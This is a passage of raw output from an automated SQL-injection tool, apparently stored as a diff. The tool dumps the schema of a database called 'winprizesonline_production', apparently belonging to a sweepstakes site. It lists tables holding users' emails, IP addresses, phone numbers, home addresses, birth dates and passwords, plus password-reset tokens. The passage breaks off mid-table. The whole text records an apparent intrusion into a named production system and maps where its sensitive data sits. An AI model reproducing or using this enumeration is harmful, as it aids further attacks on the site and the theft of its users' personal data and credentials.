+[10:37:00] [INFO] resumed: 'apr','int(10)'
+[10:37:00] [INFO] resumed: 'may','int(10)'
+[10:37:00] [INFO] resumed: 'jun','int(10)'
+[10:37:00] [INFO] resumed: 'jul','int(10)'
+[10:37:00] [INFO] resumed: 'aug','int(10)'
+[10:37:00] [INFO] resumed: 'sep','int(10)'
+[10:37:00] [INFO] resumed: 'oct','int(10)'
+[10:37:00] [INFO] resumed: 'nov','int(10)'
+[10:37:00] [INFO] resumed: 'dec','int(10)'
+[10:37:00] [INFO] resumed: 'totalPoint','int(10)'
+[10:37:00] [INFO] resumed: 'status','char(2)'
+[10:37:00] [INFO] fetching columns for table 'prizetune_category' in database 'winprizesonline_production'
+[10:37:00] [INFO] fetching columns for table 'create_sweeps_entries' in database 'winprizesonline_production'
+[10:37:02] [INFO] used SQL query returns 15 entries
+[10:37:02] [INFO] resumed: 'id','int(10)'
+[10:37:02] [INFO] resumed: 'publisherid','int(10)'
+[10:37:02] [INFO] resumed: 'sweepid','int(10)'
+[10:37:02] [INFO] resumed: 'email','varchar(200)'
+[10:37:02] [INFO] resumed: 'date','timestamp'
+[10:37:02] [INFO] resumed: 'ip','varchar(200)'
+[10:37:02] [INFO] resumed: 'country','varchar(200)'
+[10:37:02] [INFO] resumed: 'first','varchar(200)'
+[10:37:02] [INFO] resumed: 'last','varchar(200)'
+[10:37:02] [INFO] resumed: 'address','varchar(200)'
+[10:37:02] [INFO] resumed: 'city','varchar(200)'
+[10:37:02] [INFO] resumed: 'area','varchar(200)'
+[10:37:02] [INFO] resumed: 'zip','varchar(200)'
+[10:37:02] [INFO] resumed: 'phone','varchar(200)'
+[10:37:02] [INFO] resumed: 'newsletter','varchar(20)'
+[10:37:02] [INFO] fetching columns for table 'tmp_prizetune_website' in database 'winprizesonline_production'
+[10:37:03] [INFO] used SQL query returns 34 entries
+[10:37:03] [INFO] fetching columns for table 'winprizes_group_types' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'powersweeper_criteria' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'winprizes_titles_meta' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'prizetune_cronicallink' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'winprizes_random' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'winprizes_votes' in database 'winprizesonline_production'
+[10:37:03] [INFO] fetching columns for table 'prizetune_user' in database 'winprizesonline_production'
+[10:37:04] [INFO] used SQL query returns 35 entries
+[10:37:04] [INFO] fetching columns for table 'winprizes_featured_ads_webid' in database 'winprizesonline_production'
+[10:37:04] [INFO] fetching columns for table 'prizetune_event' in database 'winprizesonline_production'
+[10:37:05] [INFO] used SQL query returns 13 entries
+[10:37:05] [INFO] resumed: 'eventId','int(10)'
+[10:37:05] [INFO] resumed: 'userId','int(10)'
+[10:37:05] [INFO] resumed: 'webId','int(10)'
+[10:37:05] [INFO] resumed: 'categoryId','varchar(100)'
+[10:37:05] [INFO] resumed: 'Title','varchar(100)'
+[10:37:05] [INFO] resumed: 'Prize_value','int(20)'
+[10:37:05] [INFO] resumed: 'Sponsor','varchar(100)'
+[10:37:05] [INFO] resumed: 'clickDate','date'
+[10:37:05] [INFO] resumed: 'favourites','char(1)'
+[10:37:05] [INFO] resumed: 'clicks','int(10)'
+[10:37:05] [INFO] resumed: 'mdate','date'
+[10:37:05] [INFO] resumed: 'endDate','date'
+[10:37:05] [INFO] resumed: 'status','char(1)'
+[10:37:05] [INFO] fetching columns for table 'wpo_registration_requests' in database 'winprizesonline_production'
+[10:37:06] [INFO] used SQL query returns 21 entries
+[10:37:06] [INFO] fetching columns for table 'prizetune_prize' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table 'prizetune_website_field_list' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table 'prizetune_detail' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table 'ItemsCategories' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table '_optout' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table 'prizetune_image' in database 'winprizesonline_production'
+[10:37:06] [INFO] fetching columns for table 'prizetune_mostpopular' in database 'winprizesonline_production'
+[10:37:07] [INFO] used SQL query returns 9 entries
+[10:37:07] [INFO] resumed: 'id','int(10)'
+[10:37:07] [INFO] resumed: 'webid','int(10)'
+[10:37:07] [INFO] resumed: 'CleanTitle','varchar(100)'
+[10:37:07] [INFO] resumed: 'image','varchar(200)'
+[10:37:07] [INFO] resumed: 'Title','varchar(200)'
+[10:37:07] [INFO] resumed: 'Prize','varchar(500)'
+[10:37:07] [INFO] resumed: 'Count','int(10)'
+[10:37:07] [INFO] resumed: 'OfferTypeID','int(4)'
+[10:37:07] [INFO] resumed: 'Duration','varchar(45)'
+[10:37:07] [INFO] fetching columns for table 'Ads_Box' in database 'winprizesonline_production'
+[10:37:08] [INFO] used SQL query returns 22 entries
+Database: winprizesonline_production
+Table: prizetune_search_criteria
+[47 columns]
++-----------------+---------+
+| Column          | Type    |
++-----------------+---------+
+| category_1      | int(1)  |
+| category_10     | int(1)  |
+| category_11     | int(1)  |
+| category_12     | int(1)  |
+| category_13     | int(1)  |
+| category_14     | int(1)  |
+| category_15     | int(1)  |
+| category_16     | int(1)  |
+| category_17     | int(1)  |
+| category_18     | int(1)  |
+| category_19     | int(1)  |
+| category_2      | int(1)  |
+| category_20     | int(1)  |
+| category_21     | int(1)  |
+| category_22     | int(1)  |
+| category_23     | int(1)  |
+| category_24     | int(1)  |
+| category_25     | int(1)  |
+| category_3      | int(1)  |
+| category_4      | int(1)  |
+| category_5      | int(1)  |
+| category_6      | int(1)  |
+| category_7      | int(1)  |
+| category_8      | int(1)  |
+| category_9      | int(1)  |
+| display         | int(1)  |
+| displayorder    | int(1)  |
+| entry_1time     | int(1)  |
+| entry_daily     | int(1)  |
+| entry_monthly   | int(1)  |
+| entry_unlimited | int(1)  |
+| entry_weekly    | int(1)  |
+| prize_1         | int(1)  |
+| prize_2         | int(1)  |
+| prize_3         | int(1)  |
+| prize_4         | int(1)  |
+| prize_5         | int(1)  |
+| prize_6         | int(1)  |
+| recommend       | int(1)  |
+| type            | int(1)  |
+| type_all        | int(1)  |
+| type_auto       | int(1)  |
+| type_blog       | int(1)  |
+| type_instant    | int(1)  |
+| type_manual     | int(1)  |
+| type_prefill    | int(1)  |
+| userid          | int(10) |
++-----------------+---------+
+
+Database: winprizesonline_production
+Table: period_payment
+[5 columns]
++------------+---------------+
+| Column     | Type          |
++------------+---------------+
+| dat        | date          |
+| pay_Canada | decimal(10,2) |
+| pay_Female | decimal(10,2) |
+| pay_Male   | decimal(10,2) |
+| pay_Us     | decimal(10,2) |
++------------+---------------+
+
+Database: winprizesonline_production
+Table: winprizes_boost
+[3 columns]
++--------+-----------+
+| Column | Type      |
++--------+-----------+
+| date   | timestamp |
+| status | int(1)    |
+| webid  | int(10)   |
++--------+-----------+
+
+Database: winprizesonline_production
+Table: Setup_Ads
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| AdID   | int(11)      |
+| AreaID | int(11)      |
+| HTML   | text         |
+| Name   | varchar(100) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_winclub
+[14 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| value        | int(10)      |
+| bonusprizeId | int(11)      |
+| countryId    | int(10)      |
+| draw_date    | date         |
+| exstatus     | char(1)      |
+| prize        | varchar(200) |
+| prize_desc   | varchar(200) |
+| sponsor      | varchar(20)  |
+| status       | char(1)      |
+| userId       | int(20)      |
+| username     | varchar(100) |
+| win_date     | varchar(100) |
+| win_status   | char(2)      |
+| winId        | int(20)      |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_website_form
+[6 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| description   | varchar(2000) |
+| field_list_id | int(10)       |
+| form_id       | int(10)       |
+| form_text     | varchar(2000) |
+| form_type     | varchar(10)   |
+| link_script   | varchar(2000) |
++---------------+---------------+
+
+Database: winprizesonline_production
+Table: winprizes_forum
+[10 columns]
++----------+---------------+
+| Column   | Type          |
++----------+---------------+
+| date     | timestamp     |
+| cat      | int(2)        |
+| id       | int(20)       |
+| ip       | varchar(200)  |
+| postid   | int(20)       |
+| status   | int(1)        |
+| text     | varchar(1500) |
+| title    | varchar(200)  |
+| userid   | int(20)       |
+| username | varchar(200)  |
++----------+---------------+
+
+Database: winprizesonline_production
+Table: winprizes_advertiser
+[8 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| date   | timestamp    |
+| email  | varchar(200) |
+| id     | int(20)      |
+| ip     | varchar(100) |
+| name   | varchar(200) |
+| status | varchar(1)   |
+| title  | varchar(200) |
+| url    | varchar(100) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_category_name
+[9 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| date        | date          |
+| categoryId  | int(100)      |
+| CatNameURL  | varchar(100)  |
+| description | varchar(1000) |
+| details     | varchar(200)  |
+| groupid     | int(4)        |
+| name        | varchar(200)  |
+| status      | varchar(4)    |
+| title       | varchar(100)  |
++-------------+---------------+
+
+Database: winprizesonline_production
+Table: rateip
+[3 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| rateid | int(10)          |
+| userip | varchar(15)      |
++--------+------------------+
+
+Database: winprizesonline_production
+Table: prizetune_coupon
+[3 columns]
++------------+---------------+
+| Column     | Type          |
++------------+---------------+
+| couponCode | varchar(1000) |
+| couponId   | int(11)       |
+| webId      | int(11)       |
++------------+---------------+
+
+Database: winprizesonline_production
+Table: prizetune_param
+[2 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| name_param | varchar(40) |
+| val_param  | varchar(40) |
++------------+-------------+
+
+Database: winprizesonline_production
+Table: winprizes_admin_stats
+[21 columns]
++------------------------+---------+
+| Column                 | Type    |
++------------------------+---------+
+| date                   | date    |
+| order                  | int(10) |
+| blogs                  | int(10) |
+| comments               | int(10) |
+| create_a_sweep         | int(10) |
+| create_a_sweep_entries | int(10) |
+| entries                | int(10) |
+| forum                  | int(10) |
+| free_trial             | int(11) |
+| hided                  | int(10) |
+| login                  | int(10) |
+| new_ca                 | int(10) |
+| new_publisher          | int(10) |
+| new_sweeps             | int(10) |
+| new_us                 | int(10) |
+| new_wins               | int(10) |
+| newusers               | int(10) |
+| refered                | int(10) |
+| report                 | int(10) |
+| saved                  | int(10) |
+| upgraded               | int(10) |
++------------------------+---------+
+
+Database: winprizesonline_production
+Table: prizetune_hided
+[3 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| h_domain | int(1)  |
+| userid   | int(10) |
+| webid    | int(10) |
++----------+---------+
+
+Database: winprizesonline_production
+Table: UsersRating
+[3 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| UserID    | int(8) |
+| voteValue | int(8) |
+| WebID     | int(8) |
++-----------+--------+
+
+Database: winprizesonline_production
+Table: prizetune_deals
+[9 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| city     | varchar(50)      |
+| country  | varchar(50)      |
+| id       | int(10) unsigned |
+| location | varchar(15)      |
+| parentid | int(10)          |
+| price    | int(10)          |
+| rules    | varchar(360)     |
+| state    | varchar(50)      |
+| zip      | int(10)          |
++----------+------------------+
+
+Database: winprizesonline_production
+Table: Ads_Domain
+[13 columns]
++--------------------+--------------+
+| Column             | Type         |
++--------------------+--------------+
+| AccountID          | int(11)      |
+| AWStatsConfigure   | int(11)      |
+| DomainID           | int(11)      |
+| ExcelID            | int(11)      |
+| GooglePosition     | int(11)      |
+| IncludeSweepstakes | int(11)      |
+| IsSystem           | int(11)      |
+| LiveStatus         | int(11)      |
+| MSClientID         | int(11)      |
+| Name               | varchar(100) |
+| TemplateID         | int(11)      |
+| TypeID             | int(11)      |
+| URL                | varchar(500) |
++--------------------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_votes_pub
+[5 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| date   | date         |
+| domain | varchar(200) |
+| id     | int(20)      |
+| userid | int(20)      |
+| vote   | int(20)      |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: categories
+[9 columns]
++-------------+-------------------+
+| Column      | Type              |
++-------------+-------------------+
+| categoryId  | int(100) unsigned |
+| CatNameURL  | varchar(100)      |
+| Description | varchar(1000)     |
+| H1          | varchar(50)       |
+| HeadCount   | int(11)           |
+| IsRoot      | int(11)           |
+| Name        | varchar(200)      |
+| OfferTypeID | int(4)            |
+| ParentID    | int(4)            |
++-------------+-------------------+
+
+Database: winprizesonline_production
+Table: prizetune_user_image
+[5 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| date    | date         |
+| image   | varchar(200) |
+| imageId | int(20)      |
+| status  | char(2)      |
+| userId  | int(10)      |
++---------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_powersweeper_freetrial
+[2 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| date   | date    |
+| userId | int(11) |
++--------+---------+
+
+Database: winprizesonline_production
+Table: _domainCheck
+[2 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| DomainName | varchar(200) |
+| SEM        | text         |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_website
+[43 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| Date         | date         |
+| domain       | varchar(300) |
+| Active       | varchar(10)  |
+| Area         | varchar(100) |
+| blog         | int(1)       |
+| ca           | int(1)       |
+| categoryId   | int(10)      |
+| chances      | int(3)       |
+| Country      | int(10)      |
+| Eligible     | varchar(100) |
+| endDate      | date         |
+| enter        | int(100)     |
+| Entry        | varchar(200) |
+| EntryID      | int(11)      |
+| Expire       | date         |
+| exstatus     | char(1)      |
+| Featured     | varchar(10)  |
+| form_id      | int(10)      |
+| grandprize   | varchar(50)  |
+| image        | varchar(200) |
+| image_thumb  | varchar(200) |
+| instant      | int(1)       |
+| ip           | varchar(200) |
+| ItemPTag     | varchar(500) |
+| LinkType     | int(11)      |
+| OfferType    | int(4)       |
+| Paid         | int(11)      |
+| paypalrand   | varchar(100) |
+| Prize        | varchar(500) |
+| Prize_value  | int(20)      |
+| prizecat     | varchar(200) |
+| publisherid  | int(10)      |
+| restrictions | varchar(500) |
+| Sponsor      | varchar(30)  |
+| Status       | varchar(10)  |
+| Title        | varchar(45)  |
+| type_form    | int(2)       |
+| URL          | varchar(300) |
+| URLR         | varchar(300) |
+| us           | int(1)       |
+| userId       | int(8)       |
+| votes        | int(11)      |
+| webId        | int(10)      |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_contest
+[13 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| baby     | int(2)           |
+| city     | varchar(50)      |
+| country  | varchar(50)      |
+| game     | int(2)           |
+| id       | int(10) unsigned |
+| location | varchar(15)      |
+| other    | int(2)           |
+| parentid | int(10)          |
+| recipes  | int(2)           |
+| state    | varchar(50)      |
+| video    | int(2)           |
+| writing  | int(2)           |
+| zip      | int(10)          |
++----------+------------------+
+
+Database: winprizesonline_production
+Table: _emails
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| Email  | varchar(255) |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: ip_ban_list
+[1 column]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| ip     | varchar(20) |
++--------+-------------+
+
+Database: winprizesonline_production
+Table: rate
+[6 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| count     | int(10)          |
+| enabled   | int(4)           |
+| finalrate | float            |
+| id        | int(10) unsigned |
+| name      | varchar(100)     |
+| rate      | float            |
++-----------+------------------+
+
+Database: winprizesonline_production
+Table: images
+[6 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| Content    | blob         |
+| DomainID   | int(11)      |
+| FileName   | varchar(250) |
+| ImageID    | int(11)      |
+| LiveStatus | int(11)      |
+| PageID     | int(11)      |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_country
+[3 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| countryId | int(100)     |
+| name      | varchar(200) |
+| status    | char(1)      |
++-----------+--------------+
+
+Database: winprizesonline_production
+Table: stats
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| browser  | varchar(255) |
+| id       | int(11)      |
+| ip       | varchar(15)  |
+| recieved | date         |
++----------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_types
+[6 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| Description | varchar(1000) |
+| group_id    | int(3)        |
+| id          | int(4)        |
+| Name        | varchar(45)   |
+| sort        | int(11)       |
+| type        | varchar(500)  |
++-------------+---------------+
+
+Database: winprizesonline_production
+Table: facebook_general_info
+[4 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| keyfield   | varchar(100) |
+| LineID     | int(11)      |
+| refid      | varchar(100) |
+| valuefield | varchar(100) |
++------------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_votes_prize
+[5 columns]
++---------+---------+
+| Column  | Type    |
++---------+---------+
+| date    | date    |
+| id      | int(20) |
+| prizeid | int(20) |
+| userid  | int(20) |
+| vote    | int(10) |
++---------+---------+
+
+Database: winprizesonline_production
+Table: winprize_frontpage_random
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| date    | datetime     |
+| id      | int(10)      |
+| prizeid | int(10)      |
+| typeid  | varchar(200) |
++---------+--------------+
+
+Database: winprizesonline_production
+Table: affiliate_sites
+[8 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| AffiliateID  | int(11)      |
+| Password     | varchar(100) |
+| publisherid  | int(10)      |
+| traffic      | int(10)      |
+| Username     | varchar(100) |
+| website_desc | varchar(400) |
+| website_name | varchar(200) |
+| website_url  | varchar(200) |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: Advertisement_Record
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| clicks   | int(11)     |
+| id       | int(11)     |
+| name     | varchar(45) |
+| received | date        |
++----------+-------------+
+
+Database: winprizesonline_production
+Table: winprizes_suggest
+[11 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| date        | date         |
+| desc        | varchar(400) |
+| value       | varchar(200) |
+| cat         | varchar(200) |
+| id          | int(20)      |
+| image       | varchar(200) |
+| image_thump | varchar(200) |
+| prize       | varchar(200) |
+| status      | int(2)       |
+| userid      | int(20)      |
+| username    | varchar(200) |
++-------------+--------------+
+
+Database: winprizesonline_production
+Table: domain
+[2 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| name   | varchar(40) |
+| prio   | int(20)     |
++--------+-------------+
+
+Database: winprizesonline_production
+Table: wpo_password_reset_req
+[5 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| email    | varchar(255)     |
+| expires  | bigint(20)       |
+| ID       | int(11) unsigned |
+| selector | char(16)         |
+| token    | char(64)         |
++----------+------------------+
+
+Database: winprizesonline_production
+Table: SpecialTypes
+[12 columns]
++-------------+-------------------+
+| Column      | Type              |
++-------------+-------------------+
+| categoryId  | int(100) unsigned |
+| CatNameURL  | varchar(100)      |
+| DateFormula | varchar(500)      |
+| Description | varchar(1000)     |
+| H1          | varchar(50)       |
+| HeadCount   | int(11)           |
+| IsCheckBox  | int(11)           |
+| IsRoot      | int(11)           |
+| Name        | varchar(200)      |
+| OfferTypeID | int(4)            |
+| ParentID    | int(4)            |
+| WhereCond   | varchar(500)      |
++-------------+-------------------+
+
+Database: winprizesonline_production
+Table: winprizes_blog
+[7 columns]
++----------+---------------+
+| Column   | Type          |
++----------+---------------+
+| date     | timestamp     |
+| id       | int(20)       |
+| ip       | varchar(100)  |
+| status   | int(1)        |
+| text     | varchar(1500) |
+| userid   | int(10)       |
+| username | varchar(200)  |
++----------+---------------+
+
+Database: winprizesonline_production
+Table: RandTest
+[2 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| ID     | int(11) |
+| LineID | int(11) |
++--------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_bonus_entries
+[31 columns]
++---------------+---------------------------------------+
+| Column        | Type                                  |
++---------------+---------------------------------------+
+| first         | varchar(200)                          |
+| last          | varchar(200)                          |
+| aboutme       | varchar(1000)                         |
+| aboutme_date  | date                                  |
+| address       | varchar(200)                          |
+| address2      | varchar(200)                          |
+| area          | varchar(200)                          |
+| city          | varchar(200)                          |
+| country       | varchar(200)                          |
+| dob           | varchar(100)                          |
+| email         | varchar(200)                          |
+| flag          | enum(\\u0027Y\\u0027,\\u0027N\\u0027) |
+| image         | varchar(244)                          |
+| IP            | varchar(100)                          |
+| join_date     | varchar(100)                          |
+| loginDate     | date                                  |
+| loginStatus   | char(1)                               |
+| no_of_entries | int(100)                              |
+| no_of_friends | int(100)                              |
+| no_of_invited | int(100)                              |
+| password      | varchar(200)                          |
+| phone         | varchar(200)                          |
+| prize_value   | int(100)                              |
+| referId       | int(10)                               |
+| sex           | varchar(100)                          |
+| start_date    | datetime                              |
+| status        | char(1)                               |
+| type          | varchar(200)                          |
+| userId        | int(20)                               |
+| username      | varchar(200)                          |
+| zip           | varchar(200)                          |
++---------------+---------------------------------------+
+
+Database: winprizesonline_production
+Table: Ads_LogFile
+[35 columns]
++----------------------+---------------+
+| Column               | Type          |
++----------------------+---------------+
+| PATH                 | varchar(250)  |
+| DateStamp            | timestamp     |
+| DOCUMENT_ROOT        | varchar(250)  |
+| DomainID             | int(11)       |
+| GATEWAY_INTERFACE    | varchar(250)  |
+| HTTP_ACCEPT          | varchar(250)  |
+| HTTP_ACCEPT_CHARSET  | varchar(250)  |
+| HTTP_ACCEPT_ENCODING | varchar(250)  |
+| HTTP_ACCEPT_LANGUAGE | varchar(250)  |
+| HTTP_CACHE_CONTROL   | varchar(250)  |
+| HTTP_CONNECTION      | varchar(250)  |
+| HTTP_COOKIE          | varchar(250)  |
+| HTTP_HOST            | varchar(250)  |
+| HTTP_KEEP_ALIVE      | varchar(250)  |
+| HTTP_PRAGMA          | varchar(250)  |
+| HTTP_REFERER         | varchar(250)  |
+| HTTP_USER_AGENT      | varchar(250)  |
+| LineID               | int(11)       |
+| PageID               | int(11)       |
+| PHP_SELF             | varchar(250)  |
+| QUERY_STRING         | varchar(1000) |
+| REMOTE_ADDR          | varchar(250)  |
+| REMOTE_PORT          | varchar(250)  |
+| REQUEST_METHOD       | varchar(250)  |
+| REQUEST_TIME         | varchar(250)  |
+| REQUEST_URI          | varchar(250)  |
+| SCRIPT_FILENAME      | varchar(250)  |
+| SCRIPT_NAME          | varchar(250)  |
+| SERVER_ADDR          | varchar(250)  |
+| SERVER_ADMIN         | varchar(250)  |
+| SERVER_NAME          | varchar(250)  |
+| SERVER_PORT          | varchar(250)  |
+| SERVER_PROTOCOL      | varchar(250)  |
+| SERVER_SIGNATURE     | varchar(250)  |
+| SERVER_SOFTWARE      | varchar(250)  |
++----------------------+---------------+
+
+Database: winprizesonline_production
+Table: create_sweeps_bank
+[16 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| date      | date         |
+| domain    | varchar(200) |
+| boost     | int(1)       |
+| email     | varchar(200) |
+| entries   | int(200)     |
+| form      | int(1)       |
+| galleryid | int(10)      |
+| header    | varchar(400) |
+| id        | int(20)      |
+| ip        | varchar(200) |
+| name      | varchar(200) |
+| news_text | varchar(300) |
+| password  | varchar(200) |
+| publisher | int(20)      |
+| status    | int(1)       |
+| title     | varchar(200) |
++-----------+--------------+
+
+Database: winprizesonline_production
+Table: user_ban_list
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| userid   | int(10)     |
+| username | varchar(40) |
++----------+-------------+
+
+Database: winprizesonline_production
+Table: prizetune_winclub2
+[14 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| value        | int(10)      |
+| bonusprizeId | int(11)      |
+| countryId    | int(10)      |
+| draw_date    | date         |
+| exstatus     | char(1)      |
+| prize        | varchar(200) |
+| prize_desc   | varchar(500) |
+| sponsor      | varchar(20)  |
+| status       | char(1)      |
+| userId       | int(20)      |
+| username     | varchar(100) |
+| win_date     | varchar(100) |
+| win_status   | char(2)      |
+| winId        | int(20)      |
++--------------+--------------+
+
+Database: winprizesonline_production
+Table: wpo_powersweepercriteria
+[13 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| categories      | varchar(200) |
+| countries       | varchar(45)  |
+| display         | varchar(45)  |
+| entered         | tinyint(4)   |
+| entrytype       | varchar(45)  |
+| maxprice        | int(11)      |
+| minprice        | int(11)      |
+| notentered      | tinyint(4)   |
+| recommendothers | tinyint(4)   |
+| recommenduser   | tinyint(4)   |
+| sweeptype       | varchar(100) |
+| updatedon       | varchar(45)  |
+| userid          | int(11)      |
++-----------------+--------------+
+
+Database: winprizesonline_production
+Table: ItemsSpecialTypes
+[3 columns]
++------------+---------+
+| Column     | Type    |
++------------+---------+
+| CategoryID | int(11) |
+| LineID     | int(11) |
+| WebID      | int(11) |
++------------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_publisher
+[13 columns]
++-------------+---------------------------------------+
+| Column      | Type                                  |
++-------------+---------------------------------------+
+| email       | varchar(200)                          |
+| flag        | enum(\\u0027Y\\u0027,\\u0027N\\u0027) |
+| IP          | varchar(10)                           |
+| join_date   | date                                  |
+| LinkReqired | int(11)                               |
+| login       | date                                  |
+| loginStatus | char(1)                               |
+| name        | varchar(200)                          |
+| password    | varchar(200)                          |
+| publisherid | int(20)                               |
+| status      | char(1)                               |
+| userid      | int(20)                               |
+| username    | varchar(200)                          |
++-------------+---------------------------------------+
+
+Database: winprizesonline_production
+Table: Ads_Types
+[2 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| Name   | varchar(50) |
+| TypeID | int(11)     |
++--------+-------------+
+
+Database: winprizesonline_production
+Table: affiliate_payments
+[3 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| month       | date    |
+| amount      | int(10) |
+| publisherid | int(10) |
++-------------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_entries
+[7 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| date    | datetime     |
+| email   | varchar(200) |
+| id      | int(30)      |
+| news    | varchar(200) |
+| prizeid | int(20)      |
+| type    | varchar(200) |
+| userid  | int(20)      |
++---------+--------------+
+
+Database: winprizesonline_production
+Table: OfferTypes
+[7 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| CatNameURL  | varchar(50)   |
+| Description | varchar(1500) |
+| H1Struct    | varchar(50)   |
+| OfferType   | varchar(150)  |
+| OfferTypeId | int(11)       |
+| TagTitle    | varchar(450)  |
+| Visible     | tinyint(4)    |
++-------------+---------------+
+
+Database: winprizesonline_production
+Table: sweepstakes_notes
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| text   | varchar(500) |
+| webid  | int(10)      |
++--------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_expired_data
+[1 column]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| expiredid | int(20) |
++-----------+---------+
+
+Database: winprizesonline_production
+Table: create_sweeps_gallery
+[7 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| desc      | varchar(400) |
+| value     | int(10)      |
+| id        | int(10)      |
+| image     | varchar(200) |
+| image_big | varchar(200) |
+| title     | varchar(200) |
+| winner    | varchar(200) |
++-----------+--------------+
+
+Database: winprizesonline_production
+Table: winprizes_prizes
+[10 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| date     | date         |
+| desc     | varchar(600) |
+| value    | varchar(200) |
+| cat      | varchar(200) |
+| id       | int(200)     |
+| img      | varchar(200) |
+| img_tumb | varchar(200) |
+| text     | varchar(500) |
+| title    | varchar(200) |
+| type     | varchar(200) |
++----------+--------------+
+
+Database: winprizesonline_production
+Table: prizetune_point
+[12 columns]
++---------------------+---------+
+| Column              | Type    |
++---------------------+---------+
+| frStatus            | char(2) |
+| mdate               | date    |
+| pointByFriend       | int(8)  |
+| pointByMe           | int(8)  |
+| pointId             | int(8)  |
+| prizes              | int(8)  |
+| status              | char(2) |
+| todayEntries        | int(8)  |
+| totalEntries        | int(8)  |
+| userId              | int(8)  |
+| valueOfPrizeEntered | int(8)  |
+| valueToday          | int(10) |
++---------------------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_votes_sites
+[5 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| date   | date    |
+| id     | int(20) |
+| userid | int(20) |
+| vote   | int(10) |
+| webid  | int(20) |
++--------+---------+
+
+Database: winprizesonline_production
+Table: winprizes_comments
+[13 columns]
++----------+---------------+
+| Column   | Type          |
++----------+---------------+
+| date     | datetime      |
+| domain   | varchar(200)  |
+| time     | timestamp     |
+| blogid   | int(10)       |
+| bloguser | varchar(200)  |
+| id       | int(11)       |
+| ip       | varchar(200)  |
+| prizeid  | int(10)       |
+| status   | int(1)        |
+| text     | varchar(1500) |
+| type     | int(2)        |
+| userid   | int(20)       |
+| username | varchar(200)  |
++----------+---------------+
+
+Database: winprizesonline_production
+Table: prizetune_group
+[8 columns]
++-------------+-------------------+
+| Column      | Type              |
++-------------+-------------------+
+| date        | date              |
+| CatNameURL  | varchar(100)      |
+| details     | varchar(600)      |
+| groupId     | int(100) unsigned |
+| H1Title     | varchar(200)      |
+| name        | varchar(200)      |
